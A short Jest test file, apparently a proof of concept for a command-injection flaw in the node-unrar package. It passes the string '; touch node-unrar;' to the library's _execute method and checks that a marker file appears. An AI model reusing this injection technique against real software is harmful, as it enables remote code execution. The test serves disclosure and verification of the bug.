//https://issueexplorer.com/issue/scopsy/node-unrar/10
test("Remote code execution in node-unrar", () => {
  const Unrar = require("node-unrar");
  const fs = require("fs");
  const path = "./node-unrar";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    var rar = new Unrar("/path/to/file.rar");
    rar._execute([], "; touch node-unrar;", function () {});
  } catch (error) {}

  sleep.sleep(3);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
